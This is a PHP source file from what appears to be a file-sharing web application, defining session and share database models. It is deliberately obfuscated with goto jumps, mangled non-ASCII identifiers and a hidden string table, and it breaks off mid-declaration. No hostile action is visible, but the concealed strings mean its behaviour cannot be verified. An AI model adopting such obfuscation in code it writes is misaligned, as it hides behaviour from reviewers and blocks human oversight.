<?php
 goto DŸÌåóŒçá; A’åì±š´Ö: function beforeShutdown() { Hook::trigger($_SERVER[†˜ı][36]); } $_SERVER[$_SERVER[†˜ı][37]] = BASIC_PATH; $_SERVER[$_SERVER[†˜ı][38]] = LIB_DIR; goto Eê¸‚ï¾Í ; a¾Â¶í”’ó: class SessionModel extends ModelBase { protected $tableName = "\x73\171\163\164\145\x6d\x5f\x73\145\x73\163\151\157\x6e"; public function get($aãé±Ñ©×ã) { $fŸ˜š˜Êˆ =& $_SERVER[Ìó]; $AßĞ¹·œÇ‡ = $this->where(array($fŸ˜š˜Êˆ[2173] => $aãé±Ñ©×ã))->find(); if (!is_array($AßĞ¹·œÇ‡)) { return !1; } return $AßĞ¹·œÇ‡[$fŸ˜š˜Êˆ[688]]; } public function set($BĞ±×Êë¬¤, $Cî˜«³ÎÊÀ, $b½ŠÊ¢…ÂŠ = 3600) { $F‹”Ìä®Ü¤ =& $_SERVER[Ìó]; $e¶Â“Î™¶Ü = array($F‹”Ìä®Ü¤[2173] => $BĞ±×Êë¬¤, $F‹”Ìä®Ü¤[2102] => $Cî˜«³ÎÊÀ, $F‹”Ìä®Ü¤[2174] => $b½ŠÊ¢…ÂŠ + time()); if (Session::get($F‹”Ìä®Ü¤[2175])) { $e¶Â“Î™¶Ü[$F‹”Ìä®Ü¤[1409]] = Session::get($F‹”Ìä®Ü¤[2175]); } else { $e¶Â“Î™¶Ü[$F‹”Ìä®Ü¤[1409]] = 0; } if ($this->get($BĞ±×Êë¬¤)) { return $this->where(array($F‹”Ìä®Ü¤[2173] => $BĞ±×Êë¬¤))->save($e¶Â“Î™¶Ü); } else { return $this->add($e¶Â“Î™¶Ü, array(), !0); } } public function remove($cß¿ÜåÉ°Å) { return $this->where(array($_SERVER[Ìó][2173] => $cß¿ÜåÉ°Å))->delete(); } public function clearTimeout() { return $this->where($_SERVER[Ìó][2176] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\150\141\162\x65"; protected $dataAuto = array(array("\x6d\x6f\x64\x69\146\x79\124\x69\x6d\145", "\x74\x69\155\145", "\151\156\163\x65\162\164\54\165\x70\x64\x61\164\145", "\x66\165\x6e\143\x74\151\157\156"), array("\x63\162\145\x61\x74\145\x54\151\x6d\145", "\164\x69\x6d\x65", "\x69\156\163\145\162\164", "\146\165\x6e\x63\x74\151\157\156"), array("\x6f\x70\x74\x69\x6f\x6e\x73", '', "\151\x6e\x73\x65\x72\x74\54\x75\x70\x64\141\x74\145\x2c\x73\145\x6c\145\143\164", "\152\x73\x6f\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($AØŒÛÕ©Â›) { $EÜ¿ùµ‡ÔÕ =& $_SERVER[Ìó]; $dšÍÓöÈÄÔ = isset($AØŒÛÕ©Â›[0]) ? $AØŒÛÕ©Â›[0] : !1; return array($EÜ¿ùµ‡ÔÕ[2177] => array(USER_ID, $EÜ¿ùµ‡ÔÕ[2178]), $EÜ¿ùµ‡ÔÕ[2140] => array($dšÍÓöÈÄÔ, $EÜ¿ùµ‡ÔÕ[2179])); } protected function listSimple() { $E½¦ƒ“¼ğÚ = array($_SERVER[Ìó][1409] => USER_ID); $DŞ‡ÑÓ·ÁÑ = $this->field($this->fieldList)->where($E½¦ƒ“¼ğÚ)->select(); return $DŞ‡ÑÓ·ÁÑ ? $DŞ‡ÑÓ·ÁÑ : array(); } protected function getInfo($E‹åïêâ“Ú, $eº„©¯¨Ù = false) { $AÊç‡†¸åë =& $_SERVER[Ìó]; if ($eº„©¯¨Ù) { return $this->_getShareInfo(array($AÊç‡†¸åë[436] => $E‹åïêâ“Ú)); } $cÅ¨ö¨Ú·å = $this->cacheFunctionGet($AÊç‡†¸åë[2180], $E‹åïêâ“Ú); return $cÅ¨ö¨Ú·å; } public function getInfoByHash($DŠâ¬¸³„Š) { return $this->_getShareInfo(array($_SERVER[Ìó][438] => $DŠâ¬¸³„Š)); } public function getInfoByPath($aéŸÃ‚†ÍŞ) { $FâØÁá…©´ =& $_SERVER[Ìó]; $D¸Ÿçô‡ƒ = array($FâØÁá…©´[1409] => USER_ID, $FâØÁá…©´[365] => $aéŸÃ‚†ÍŞ); return $this->_getShareInfo($D¸Ÿçô‡ƒ); } public function getInfoBySourcePath($a÷§Ñ¹ó) { $Cò´Æ œˆ =& $_SERVER[Ìó]; $d™’Éƒ‰¾é = array($Cò´Æ œˆ[1409] => USER_ID, $Cò´Æ œˆ[1014] => $a÷§Ñ¹ó); return $this->_getShareInfo($d™’Éƒ‰¾é); } private function _getShareInfo($D„æ£óá÷«) { goto FÇÀ…ï¤õ»; E»Øˆ¼ë‹: $D„æ£óá÷« = array($C¾Ã³—Æ–ƒ[436] => $BùÜäÍº‹š[$C¾Ã³—Æ–ƒ[436]]); $fíŞËá›ç = $C¾Ã³—Æ–ƒ[2181]; $f¾¸Ã–Ù·ë = Model($C¾Ã³—Æ–ƒ[532])->order($C¾Ã³—Æ–ƒ[363])->field($fíŞËá›ç)->where($D„æ£óá÷«)->select(); goto dç…«î½®; FÇÀ…ï¤õ»: $C¾Ã³—Æ–ƒ =& $_SERVER[Ìó]; $BùÜäÍº‹š = $this->where($D„æ£óá÷«)->find(); if (!$BùÜäÍº‹š) { return !1; } goto E»Øˆ¼ë‹; dç…«î½®: if ($BùÜäÍº‹š[$C¾Ã³—Æ–ƒ[365]] == $C¾Ã³—Æ–ƒ[463]) { $BùÜäÍº‹š[$C¾Ã³—Æ–ƒ[387]] = IO::info($BùÜäÍº‹š[$C¾Ã³—Æ–ƒ[1014]]); } else { $BùÜäÍº‹š[$C¾Ã³—Æ–ƒ[387]] = Model($C¾Ã³—Æ–ƒ[1106])->pathInfo($BùÜäÍº‹š[$C¾Ã³—Æ–ƒ[365]]); } $BùÜäÍº‹š[$C¾Ã³—Æ–ƒ[2182]] = $f¾¸Ã–Ù·ë; return $BùÜäÍº‹š; goto c™›¸•Òšá; c™›¸•Òšá: } protected function getInfoAuth($EˆÙÆÅá³©) { $b·ˆªˆ·Ï =& $_SERVER[Ìó]; $cÕ›òî›« = $this->getInfo($EˆÙÆÅá³©); $cÕ›òî›«[$b·ˆªˆ·Ï[372]] = Model($b·ˆªˆ·Ï[449])->authMake($cÕ›òî›«[$b·ˆªˆ·Ï[2182]]); return $cÕ›òî›«; } protected function listData($c¶–Ì»ÙÀê = null, $DñÔä‡Ä¼ = 300) { $F±ë¼ù«ÑÉ =& $_SERVER[Ìó]; $fŞÅÒÜè²ï = array(array($F±ë¼ù«ÑÉ[441] => array($F±ë¼ù«ÑÉ[924], 0), $F±ë¼ù«ÑÉ[443] => array($F±ë¼ù«ÑÉ[924], 0), $F±ë¼ù«ÑÉ[2183] => $F±ë¼ù«ÑÉ[2152])); if ($c¶–Ì»ÙÀê == $F±ë¼ù«ÑÉ[1839]) { $fŞÅÒÜè²ï = array($F±ë¼ù«ÑÉ[441] => 1); } else { if ($c¶–Ì»ÙÀê == $F±ë¼ù«ÑÉ[1003]) { $fŞÅÒÜè²ï = array($F±ë¼ù«ÑÉ[443] => 1); } } $fŞÅÒÜè²ï[$F±ë¼ù«ÑÉ[1409]] = USER_ID; $e‚… Â •Ë = $this->where($fŞÅÒÜè²ï)->selectPage($DñÔä‡Ä¼); return $e‚… Â •Ë; } protected function listToMe($aéÛØÄ÷‘ƒ = 300) { goto DÊ¢±ÆÙÜŸ; c…¡Ìê²ì: $F½ÅÃŠŞØÀ = array($F ØÑ· °‚[436] => array($F ØÑ· °‚[380], array_keys($fæÜ·‚‚Ï))); $AëÊµò£³Ğ = $this->field($D‰ª§ƒİ¹Ö)->where($F½ÅÃŠŞØÀ)->select(); foreach ($AëÊµò£³Ğ as $EãØƒÓ´” => &$b«ò®×ŸÛ) { $b«ò®×ŸÛ[$F ØÑ· °‚[2182]] = $fæÜ·‚‚Ï[$b«ò®×ŸÛ[$F ØÑ· °‚[436]]]; } goto EÜ‡‹ƒÇ×ó; DÊ¢±ÆÙÜŸ: $F ØÑ· °‚ =& $_SERVER[Ìó]; $cÑ÷Àä¯¤‰ = Session::get($F ØÑ· °‚[2184]); $dÇ·ìİ¢â = array_to_keyvalue($cÑ÷Àä¯¤‰, $F ØÑ· °‚[33], $F ØÑ· °‚[2072]); goto e¥ª‹øŒ; E¯Í¬õ ³: $fæÜ·‚‚Ï = array_to_keyvalue_group($fÖ°®î³[$F ØÑ· °‚[350]], $F ØÑ· °‚[436]); if (!$fæÜ·‚‚Ï) { return $fÖ°®î³; } $D‰ª§ƒİ¹Ö = $F ØÑ· °‚[2185]; goto c…¡Ìê²ì; e¥ª‹øŒ: $F½ÅÃŠŞØÀ = array($F ØÑ· °‚[516] => SourceModel::TYPE_USER, $F ØÑ· °‚[451] => USER_ID); if ($dÇ·ìİ¢â) { $F½ÅÃŠŞØÀ = array(array($F ØÑ· °‚[516] => SourceModel::TYPE_USER, $F ØÑ· °‚[451] => USER_ID), array($F ØÑ· °‚[516] => SourceModel::TYPE_GROUP, $F ØÑ· °‚[451] => array($F ØÑ· °‚[7], $dÇ·ìİ¢â)), $F ØÑ· °‚[2183] => $F ØÑ· °‚[2152]); } $fÖ°®î³ = Model($F ØÑ· °‚[532])->where($F½ÅÃŠŞØÀ)->selectPage($aéÛØÄ÷‘ƒ); goto E¯Í¬õ ³; EÜ‡‹ƒÇ×ó: $CÓšìÑ©Ú = array($F ØÑ· °‚[2186] => $AëÊµò£³Ğ, $F ØÑ· °‚[2187] => $fÖ°®î³[$F ØÑ· °‚[347]]); return $CÓšìÑ©Ú; goto AéÏ…„í–; AéÏ…„í–: } protected function shareAdd($eáİ‹Ğøèº, $Dİ¥ª›æ«Ó) { $CŞæÌò†Ù‚ =& $_SERVER[Ìó]; $E„ÂñŞÍÃ = $this->_addShareData($eáİ‹Ğøèº, $Dİ¥ª›æ«Ó); if (!empty($Dİ¥ª›æ«Ó[$CŞæÌò†Ù‚[2188]])) { $this->_shareAuthSet($E„ÂñŞÍÃ, $Dİ¥ª›æ«Ó[$CŞæÌò†Ù‚[2188]]); } $this->shareEventAdd($eáİ‹Ğøèº, $Dİ¥ª›æ«Ó, $CŞæÌò†Ù‚[1006]); return $E„ÂñŞÍÃ; } private function shareEventAdd($A®ÍÄƒÖÀ–, $cÅÔ­öÆ°¯, $d÷â‰ÚÒèˆ = "\141\144\x64") { goto EùÊçîº¢©; E…¤¶Í¹ÓÀ: if ($Cñô‹á‘ñá[$c÷è‰Æ¹Ü[443]] == $c÷è‰Æ¹Ü[463] && $cÅÔ­öÆ°¯[$c÷è‰Æ¹Ü[443]] == $c÷è‰Æ¹Ü[83]) { $D©Úµ Ë¹Ö = $c÷è‰Æ¹Ü[2190]; } if ($Cñô‹á‘ñá[$c÷è‰Æ¹Ü[443]] == $c÷è‰Æ¹Ü[83] && $cÅÔ­öÆ°¯[$c÷è‰Æ¹Ü[443]] == $c÷è‰Æ¹Ü[463]) { $D©Úµ Ë¹Ö = $c÷è‰Æ¹Ü[2193]; } Model($c÷è‰Æ¹Ü[500])->eventShare($A®ÍÄƒÖÀ–, $D©Úµ Ë¹Ö); goto eÂÇ³ƒŸ®; EùÊçîº¢©: $c÷è‰Æ¹Ü =& $_SERVER[Ìó]; if ($d÷â‰ÚÒèˆ == $c÷è‰Æ¹Ü[1006]) { if ($cÅÔ­öÆ°¯[$c÷è‰Æ¹Ü[441]] == $c÷è‰Æ¹Ü[83]) { Model($c÷è‰Æ¹Ü[500])->eventShare($A®ÍÄƒÖÀ–, $c÷è‰Æ¹Ü[2189]); } if ($cÅÔ­öÆ°¯[$c÷è‰Æ¹Ü[443]] == $c÷è‰Æ¹Ü[83]) { Model($c÷è‰Æ¹Ü[500])->eventShare($A®ÍÄƒÖÀ–, $c÷è‰Æ¹Ü[2190]); } return; } $Cñô‹á‘ñá = $this->getInfoByPath($A®ÍÄƒÖÀ–); goto eù¡Š¢ Ûò; eù¡Š¢ Ûò: $D©Úµ Ë¹Ö = $c÷è‰Æ¹Ü[2191]; if ($Cñô‹á‘ñá[$c÷è‰Æ¹Ü[441]] == $c÷è‰Æ¹Ü[463] && $cÅÔ­öÆ°¯[$c÷è‰Æ¹Ü[441]] == $c÷è‰Æ¹Ü[83]) { $D©Úµ Ë¹Ö = $c÷è‰Æ¹Ü[2189]; } if ($Cñô‹á‘ñá[$c÷è‰Æ¹Ü[441]] == $c÷è‰Æ¹Ü[83] && $cÅÔ­öÆ°¯[$c÷è‰Æ¹Ü[441]] == $c÷è‰Æ¹Ü[463]) { $D©Úµ Ë¹Ö = $c÷è‰Æ¹Ü[2192]; } goto E…¤¶Í¹ÓÀ; eÂÇ³ƒŸ®: return; goto c ìºÃŞ§Š; c ìºÃŞ§Š: } private function _addShareData($bâ«´»º‘, $D½‚²Õå¦¿ = array()) { goto CùçÑ¶¾Ğ; dšË®ÏÃâ­: $bÖ’Ï¥®Á = $this->add($DÍÛ¨á—ó); $AäÁîâµ = array($bô¾›¾ŠùØ[438] => short_id($bÖ’Ï¥®Á)); $this->where(array($bô¾›¾ŠùØ[435] => $bÖ’Ï¥®Á))->save($AäÁîâµ); goto c¨Óø¶„³Ë; BˆĞ›øÛ†: $DÍÛ¨á—ó = array($bô¾›¾ŠùØ[1400] => USER_ID, $bô¾›¾ŠùØ[379] => $bâ«´»º‘, $bô¾›¾ŠùØ[1317] => $bô¾›¾ŠùØ[33], $bô¾›¾ŠùØ[441] => 0, $bô¾›¾ŠùØ[443] => 0, $bô¾›¾ŠùØ[1014] => $bô¾›¾ŠùØ[33], $bô¾›¾ŠùØ[291] => $bô¾›¾ŠùØ[33], $bô¾›¾ŠùØ[800] => $bô¾›¾ŠùØ[33], $bô¾›¾ŠùØ[2195] => 0, $bô¾›¾ŠùØ[2196] => 0, $bô¾›¾ŠùØ[699] => 0, $bô¾›¾ŠùØ[2197] => $bô¾›¾ŠùØ[33], $bô¾›¾ŠùØ[438] => $bô¾›¾ŠùØ[33]); $bĞÓåçùÃµ = explode($bô¾›¾ŠùØ[47], $bô¾›¾ŠùØ[2198]); foreach ($bĞÓåçùÃµ as $câ „Ö–¤) { if (!isset($D½‚²Õå¦¿[$câ „Ö–¤])) { continue; } $DÍÛ¨á—ó[$câ „Ö–¤] = $D½‚²Õå¦¿[$câ „Ö–¤]; } goto dšË®ÏÃâ­; Cê˜ãÀï®”: if ($EÙôê²ìŠ = $this->where($Få¢ïÕ„êİ)->find()) { return $EÙôê²ìŠ[$bô¾›¾ŠùØ[436]]; } if ($bâ«´»º‘ == 0) { $B×¯¥ö“÷Õ = array($bô¾›¾ŠùØ[28] => get_path_this($D½‚²Õå¦¿[$bô¾›¾ŠùØ[75]])); } else { $B×¯¥ö“÷Õ = Model($bô¾›¾ŠùØ[748])->sourceInfo($bâ«´»º‘); if (!$B×¯¥ö“÷Õ) { return !1; } } if (!$D½‚²Õå¦¿[$bô¾›¾ŠùØ[1317]]) { $D½‚²Õå¦¿[$bô¾›¾ŠùØ[1317]] = $B×¯¥ö“÷Õ[$bô¾›¾ŠùØ[28]]; } goto BˆĞ›øÛ†; CùçÑ¶¾Ğ: $bô¾›¾ŠùØ =& $_SERVER[Ìó]; $Få¢ïÕ„êİ = array($bô¾›¾ŠùØ[379] => $bâ«´»º‘, $bô¾›¾ŠùØ[1400] => USER_ID); if ($bâ«´»º‘ == 0) { $Få¢ïÕ„êİ = array($bô¾›¾ŠùØ[2194] => $D½‚²Õå¦¿[$bô¾›¾ŠùØ[1014]], $bô¾›¾ŠùØ[1400] => USER_ID); } goto Cê˜ãÀï®”; c¨Óø¶„³Ë: return $bÖ’Ï¥®Á; goto C §£Ææùö; C §£Ææùö: } private function _shareAuthSet($CÕï‚ç™«¾, $dïâİª˜ƒƒ) { goto FŸŸ•“âŠ‹; FŸŸ•“âŠ‹: $FÚ§¹ —Ï =& $_SERVER[Ìó]; if (!is_array($dïâİª˜ƒƒ)) { return !1; } $C‚¼ØÑ«š = Model($FÚ§¹ —Ï[2199]); goto f¡±…Òšáä; f­Ó„§¨ª‹: return $C‚¼ØÑ«š->addAll($b§Š¿Ìî­Ë, array(), !0); goto aÌ’ª²£Ş; f¡±…Òšáä: $C‚¼ØÑ«š->where(array($FÚ§¹ —Ï[436] => $CÕï‚ç™«¾))->delete(); $b§Š¿Ìî­Ë = array(); foreach ($dïâİª˜ƒƒ as $E×â•¥šì®) { $CÚÛ•åŠ‹ = SourceModel::TYPE_USER; if ($E×â•¥šì®[$FÚ§¹ —Ï[367]] == SourceModel::TYPE_GROUP) { $CÚÛ•åŠ‹ = SourceModel::TYPE_GROUP; } $e×î½Œ¾¼• = array($FÚ§¹ —Ï[436] => $CÕï‚ç™«¾, $FÚ§¹ —Ï[367] => $CÚÛ•åŠ‹, $FÚ§¹ —Ï[451] => intval($E×â•¥šì®[$FÚ§¹ —Ï[451]]), $FÚ§¹ —Ï[2200] => 0, $FÚ§¹ —Ï[2201] => -1); if ($E×â•¥šì®[$FÚ§¹ —Ï[2200]]) { $e×î½Œ¾¼•[$FÚ§¹ —Ï[2200]] = $E×â•¥šì®[$FÚ§¹ —Ï[2200]]; } else { if ($E×â•¥šì®[$FÚ§¹ —Ï[2201]]) { $e×î½Œ¾¼•[$FÚ§¹ —Ï[2201]] = $E×â•¥šì®[$FÚ§¹ —Ï[2201]]; } } $b§Š¿Ìî­Ë[] = $e×î½Œ¾¼•; } goto f­Ó„§¨ª‹; aÌ’ª²£Ş: } public function numViewAdd($Eê‰ñ©…ù) { $Cñ’˜õê‹» =& $_SERVER[Ìó]; $F½¤å—±±‹ = array($Cñ’˜õê‹»[435] => $Eê‰ñ©…ù); $this->where($F½¤å—±±‹)->setAdd($Cñ’˜õê‹»[2195]); } public function numDownloadAdd($B¨ïÏæè»±) { $E¬Ÿ¹ùÛø‰ =& $_SERVER[Ìó]; $cÑİ„óÖ´ƒ = array($E¬Ÿ¹ùÛø‰[435] => $B¨ïÏæè»±); $this->where($cÑİ„óÖ´ƒ)->setAdd($E¬Ÿ¹ùÛø‰[2196]); } protected function shareEdit($cÂË¡¯† ¡, $còí¶©¨‡¡) { goto Dˆ²’ª¶§ç; cƒòØËê”¸: if (isset($còí¶©¨‡¡[$D»âß–õ…Æ[2188]])) { $this->_shareAuthSet($cÂË¡¯† ¡, $còí¶©¨‡¡[$D»âß–õ…Æ[2188]]); } return !0; goto e¼Ø¿˜Ä¸; Dˆ²’ª¶§ç: $D»âß–õ…Æ =& $_SERVER[Ìó]; $DÍ Ÿ÷†Ğ© = $this->getInfo($cÂË¡¯† ¡); if (!$DÍ Ÿ÷†Ğ©) { return !1; } goto F¾Ö˜‘Àäµ; d½‚á™ŠåĞ: foreach ($Fï‚ÚìÉà© as $A²¹ÊŒ˜½„) { if (!array_key_exists($A²¹ÊŒ˜½„, $còí¶©¨‡¡)) { continue; } $d¿…ÄŒáçÑ[$A²¹ÊŒ˜½„] = $còí¶©¨‡¡[$A²¹ÊŒ˜½„]; } $this->shareEventAdd($DÍ Ÿ÷†Ğ©[$D»âß–õ…Æ[365]], $còí¶©¨‡¡, $D»âß–õ…Æ[2040]); $this->where(array($D»âß–õ…Æ[435] => $cÂË¡¯† ¡))->save($d¿…ÄŒáçÑ); goto cƒòØËê”¸; F¾Ö˜‘Àäµ: $this->_checkLinkShare($còí¶©¨‡¡, $DÍ Ÿ÷†Ğ©); $d¿…ÄŒáçÑ = array(); $Fï‚ÚìÉà© = explode($D»âß–õ…Æ[47], $D»âß–õ…Æ[2202]); goto d½‚á™ŠåĞ; e¼Ø¿˜Ä¸: } private function _checkLinkShare($b¡Íï–Ù˜½, $e«Ş¥Ÿ„ï¤) { goto B¨Ê‹ÁÕ; AĞã•œÆî‰: if ($e«Ş¥Ÿ„ï¤[$F§Á‡Ç¹ÌÔ[387]][$F§Á‡Ç¹ÌÔ[29]] != $F§Á‡Ç¹ÌÔ[163]) { $EÔàáÓÊœŞ = $this->_folderReport($eæÎ‹¯²È¢); if (!$EÔàáÓÊœŞ) { return; } show_json(LNG($F§Á‡Ç¹ÌÔ[2203]) . $F§Á‡Ç¹ÌÔ[2204] . $EÔàáÓÊœŞ, !1); } $aË†Ä¤ÁË• = Model($F§Á‡Ç¹ÌÔ[748])->fileInfoGet($e«Ş¥Ÿ„ï¤[$F§Á‡Ç¹ÌÔ[387]][$F§Á‡Ç¹ÌÔ[365]]); if (!$aË†Ä¤ÁË•) { return; } goto C„î§ÛŠ…; C„î§ÛŠ…: $DóàøÕìö¡ = $this->shareFileMeta($aË†Ä¤ÁË•[$F§Á‡Ç¹ÌÔ[414]]); if (isset($DóàøÕìö¡[$F§Á‡Ç¹ÌÔ[355]]) && $DóàøÕìö¡[$F§Á‡Ç¹ÌÔ[355]] == $F§Á‡Ç¹ÌÔ[83]) { show_json(LNG($F§Á‡Ç¹ÌÔ[2205]), !1); } goto c×¢ÏÉî; B¨Ê‹ÁÕ: $F§Á‡Ç¹ÌÔ =& $_SERVER[Ìó]; if ($b¡Íï–Ù˜½[$F§Á‡Ç¹ÌÔ[441]] != $F§Á‡Ç¹ÌÔ[83]) { return; } $eæÎ‹¯²È¢ = $e«Ş¥Ÿ„ï¤[$F§Á‡Ç¹ÌÔ[387]][$F§Á‡Ç¹ÌÔ[365]]; goto AĞã•œÆî‰; c×¢ÏÉî: } private function _folderReport($A³Ñ™š¾Ü«) { goto B–¾Ş¨îâ; dËõÒ…¾¯Ñ: if (!$aÀÚš’¼) { return !1; } $aÀÚš’¼ = array_to_keyvalue($aÀÚš’¼, $BæØš¬™â¹[33], $BæØš¬™â¹[414]); $dÃ‚Ğª®­» = $BæØš¬™â¹[47] . $A³Ñ™š¾Ü« . $BæØš¬™â¹[47]; goto dÒšªß¦Ë; B–¾Ş¨îâ: $BæØš¬™â¹ =& $_SERVER[Ìó]; $EØÉ—»‡íÑ = array($BæØš¬™â¹[414] => array($BæØš¬™â¹[924], 0), $BæØš¬™â¹[685] => 3); $aÀÚš’¼ = Model($BæØš¬™â¹[2206])->where($EØÉ—»‡íÑ)->field($BæØš¬™â¹[414])->select(); goto dËõÒ…¾¯Ñ; E÷·êØˆœ: $a’Å“ÒÊ¬† = array_to_keyvalue($bÙ‡ˆ»ï¡­, $BæØš¬™â¹[33], $BæØš¬™â¹[28]); $a’Å“ÒÊ¬†[] = $e´•ˆÏ¢„“[$BæØš¬™â¹[28]]; return implode($BæØš¬™â¹[8], $a’Å“ÒÊ¬†); goto C©¾¦Å³¸; C×„‹ÄÏÊ: $eÏŒÏ‘º«¥ = substr($e´•ˆÏ¢„“[$BæØš¬™â¹[454]], strpos($e´•ˆÏ¢„“[$BæØš¬™â¹[454]], $dÃ‚Ğª®­»)); $EØÉ—»‡íÑ = array($BæØš¬™â¹[365] => array($BæØš¬™â¹[7], trim($eÏŒÏ‘º«¥, $BæØš¬™â¹[47]))); $bÙ‡ˆ»ï¡­ = Model($BæØš¬™â¹[748])->where($EØÉ—»‡íÑ)->field($BæØš¬™â¹[28])->select(); goto E÷·êØˆœ; dÒšªß¦Ë: $EØÉ—»‡íÑ = array($BæØš¬™â¹[414] => array($BæØš¬™â¹[7], $aÀÚš’¼), $BæØš¬™â¹[454] => array($BæØš¬™â¹[747], "\45{$dÃ‚Ğª®­»}\45"), $BæØš¬™â¹[392] => 0); $e´•ˆÏ¢„“ = Model($BæØš¬™â¹[748])->where($EØÉ—»‡íÑ)->field($BæØš¬™â¹[2207])->find(); if (!$e´•ˆÏ¢„“) { return !1; } goto C×„‹ÄÏÊ; C©¾¦Å³¸: } protected function remove($f´ŸÅÄ•×š) { goto D·…œè—Œ¢; F†·ê‚Ì‘ä: $dòÀ¼ÅòĞï = $this->where($E§†ˆ˜´ÎÇ)->delete(); if ($dòÀ¼ÅòĞï) { Model($DÄ”ÌóãÉ[532])->where(array($DÄ”ÌóãÉ[436] => $f´ŸÅÄ•×š))->delete(); } $f£Íƒ‡Ñğß = is_array($f´ŸÅÄ•×š) ? $f´ŸÅÄ•×š[1] : array($f´ŸÅÄ•×š); goto bóìŞƒƒä; D·…œè—Œ¢: $DÄ”ÌóãÉ =& $_SERVER[Ìó]; if (is_array($f´ŸÅÄ•×š)) { $f´ŸÅÄ•×š = array($DÄ”ÌóãÉ[7], $f´ŸÅÄ•×š); } $E§†ˆ˜´ÎÇ = array($DÄ”ÌóãÉ[436] => $f´ŸÅÄ•×š); goto F†·ê‚Ì‘ä; bóìŞƒƒä: for ($AçƒÀ‚—ù = 0; $AçƒÀ‚—ù < count($f£Íƒ‡Ñğß); $AçƒÀ‚—ù++) { $d×›â‚ µ½ = $this->getInfo($f£Íƒ‡Ñğß[$AçƒÀ‚—ù]); if ($d×›â‚ µ½[$DÄ”ÌóãÉ[443]] == $DÄ”ÌóãÉ[83]) { Model($DÄ”ÌóãÉ[500])->eventShare($d×›â‚ µ½[$DÄ”ÌóãÉ[365]], $DÄ”ÌóãÉ[2193]); } if ($d×›â‚ µ½[$DÄ”ÌóãÉ[441]] == $DÄ”ÌóãÉ[83]) { Model($DÄ”ÌóãÉ[500])->eventShare($d×›â‚ µ½[$DÄ”ÌóãÉ[365]], $DÄ”ÌóãÉ[2192]); } } return $dòÀ¼ÅòĞï; goto C¤”ó˜½›ß; C¤”ó˜½›ß: } protected function removeBySource($d¤›Ï¤õÆ£) { goto aæõ¾‚‘˜²; aæõ¾‚‘˜²: $FÚ¿Š÷àŸß =& $_SERVER[Ìó]; $DŠ£Í’ä‹ñ = array($FÚ¿Š÷àŸß[379] => array($FÚ¿Š÷àŸß[380], $d¤›Ï¤õÆ£)); $cÚ·¾¶ùäÙ = $this->field($FÚ¿Š÷àŸß[436])->where($DŠ£Í’ä‹ñ)->select(); goto c÷®Şó×‹¢; E„·‚¢ğ¥: $this->where($DŠ£Í’ä‹ñ)->delete(); Model($FÚ¿Š÷àŸß[532])->where($DŠ£Í’ä‹ñ)->delete(); goto fñÜ†Ìö»—; c÷®Şó×‹¢: $cÚ·¾¶ùäÙ = array_to_keyvalue($cÚ·¾¶ùäÙ, $FÚ¿Š÷àŸß[33], $FÚ¿Š÷àŸß[436]); if (!$cÚ·¾¶ùäÙ) { return; } $DŠ£Í’ä‹ñ = array($FÚ¿Š÷àŸß[435] => array($FÚ¿Š÷àŸß[380], $cÚ·¾¶ùäÙ)); goto E„·‚¢ğ¥; fñÜ†Ìö»—: } public function listAll($dµ²Ò©âŞå) { goto CÈ¨‡Èİ–Ú; câïÕ‰İ: if ($dµ²Ò©âŞå[$f¤È×õ›…[698]]) { $F¶ ŸĞŒø‚ = $dµ²Ò©âŞå[$f¤È×õ›…[699]] ? $dµ²Ò©âŞå[$f¤È×õ›…[699]] : strtotime(date($f¤È×õ›…[2208])); $a„¶òÈÊ[$f¤È×õ›…[183]] = array($f¤È×õ›…[317], array($dµ²Ò©âŞå[$f¤È×õ›…[698]], $F¶ ŸĞŒø‚)); } if ($dµ²Ò©âŞå[$f¤È×õ›…[29]]) { $a„¶òÈÊ[$dµ²Ò©âŞå[$f¤È×õ›…[29]]] = 1; } else { $a„¶òÈÊ[] = array($f¤È×õ›…[441] => array($f¤È×õ›…[924], 0), $f¤È×õ›…[443] => array($f¤È×õ›…[924], 0), $f¤È×õ›…[2183] => $f¤È×õ›…[2152]); } if ($dµ²Ò©âŞå[$f¤È×õ›…[2148]]) { $a„¶òÈÊ[] = array($f¤È×õ›…[438] => $dµ²Ò©âŞå[$f¤È×õ›…[2148]], $f¤È×õ›…[1317] => array($f¤È×õ›…[747], "\x25{$dµ²Ò©âŞå[$f¤È×õ›…[2148]]}\45"), $f¤È×õ›…[2183] => $f¤È×õ›…[2152]); } goto f”¹ôÒ©åõ; f¡¿Ã‚”ñÇ: return $bˆËé¼äŠ†; goto e‡™¡í£–‹; f”¹ôÒ©åõ: $bˆËé¼äŠ† = $this->_makeOrder()->where($a„¶òÈÊ)->selectPage(20); if (empty($bˆËé¼äŠ†[$f¤È×õ›…[350]])) { return array(); } $this->_listDataApply($bˆËé¼äŠ†[$f¤È×õ›…[350]]); goto f¡¿Ã‚”ñÇ; CÈ¨‡Èİ–Ú: $f¤È×õ›… =& $_SERVER[Ìó]; $a„¶òÈÊ = array(); if ($dµ²Ò©âŞå[$f¤È×õ›…[1409]]) { $a„¶òÈÊ[$f¤È×õ›…[1409]] = $dµ²Ò©âŞå[$f¤È×õ›…[1409]]; } goto câïÕ‰İ; e‡™¡í£–‹: } public function listDataApply($b²·¢Àá²·) { $this->_listDataApply($b²·¢Àá²·); return $b²·¢Àá²·; } private function _listDataApply(&$b³¡ØáİéÕ) { $E£ª«’Ş¾ =& $_SERVER[Ìó]; $d´õ±±ØÜ¼ = array_to_keyvalue($b³¡ØáİéÕ, $E£ª«’Ş¾[33], $E£ª«’Ş¾[1409]); $e˜·Ôá–ğˆ = Model($E£ª«’Ş¾[472])->userListInfo(array_unique($d´õ±±ØÜ¼)); $A–Ñ»ØŒÖŸ = array_to_keyvalue($b³¡ØáİéÕ, $E£ª«’Ş¾[33], $E£ª«’Ş¾[365]); $C§ÂïÛâÃÙ = Model($E£ª«’Ş¾[748])->sourceListInfo($A–Ñ»ØŒÖŸ, !0); foreach ($b³¡ØáİéÕ as &$CĞâ¨¯¶³) { $Eï‹¶‡ô›“ = $CĞâ¨¯¶³[$E£ª«’Ş¾[1409]]; $CĞâ¨¯¶³[$E£ª«’Ş¾[2209]] = $e˜·Ôá–ğˆ[$Eï‹¶‡ô›“] ? $e˜·Ôá–ğˆ[$Eï‹¶‡ô›“] : !1; $f §ğìò‰ = $CĞâ¨¯¶³[$E£ª«’Ş¾[365]]; $CĞâ¨¯¶³[$E£ª«’Ş¾[387]] = $C§ÂïÛâÃÙ[$f §ğìò‰] ? $C§ÂïÛâÃÙ[$f §ğìò‰] : !1; } } private function 